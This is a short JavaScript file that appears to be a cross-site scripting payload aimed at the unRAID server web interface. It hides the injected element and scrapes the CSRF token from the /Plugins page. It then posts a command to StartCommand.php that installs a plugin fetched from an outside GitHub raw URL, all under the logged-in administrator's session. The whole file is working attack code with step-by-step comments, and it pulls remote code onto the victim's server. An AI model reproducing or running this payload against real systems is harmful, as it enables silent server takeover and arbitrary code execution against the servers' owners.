var pluginURL = 'https://raw.githubusercontent.com/justin-himself/test/refs/heads/main/unRAIDCore.plg';
var encodedPluginURL = encodeURIComponent(pluginURL);

// Select the div with a specific 'data-appname' value that contains JavaScript code
var div = document.querySelector('[data-appname="<script>fetch("]');

// Hide the selected div by setting its 'display' style property to 'none'
div.style.display = 'none';  // This hides the element from view without removing it from the DOM

// Perform a GET request to retrieve the current page's `/Plugins` endpoint
fetch('/Plugins')
  .then(response => response.text())  // Convert the response HTML into plain text
  .then(html => {
    // Use a regular expression to search for the CSRF token embedded in the HTML
    const csrfTokenMatch = html.match(/\s*var csrf_token\s*=\s*"([^"]+)";/);

    // If the CSRF token is found, store it in a variable
    if (csrfTokenMatch && csrfTokenMatch[1]) {
      var csrfToken = csrfTokenMatch[1];  // Assign the token to the variable
      
      // Make a POST request to `/webGui/include/StartCommand.php` to trigger the plugin installation
      return fetch('/webGui/include/StartCommand.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'X-Requested-With': 'XMLHttpRequest'
        },
        // Send the CSRF token and the command to install the plugin as part of the POST body
        body: `cmd=plugin+install+${encodedPluginURL}+nchan&start=0&csrf_token=${csrfToken}`,
        credentials: 'same-origin'  // Ensures that any cookies related to the page are sent along with the request
      });
    } else {
      // If the CSRF token could not be found, throw an error
      throw new Error('CSRF token not found.');
    }
  })
  .then(postResponse => postResponse.text())  // Process the response text from the POST request
  .then(postData => {
    // Log the successful response from the server (e.g., confirmation of plugin installation)
    console.log('POST request successful:', postData);
  })
  .catch(error => {
    // Handle any errors that occur during the GET or POST request
    console.error('Error:', error);
  });
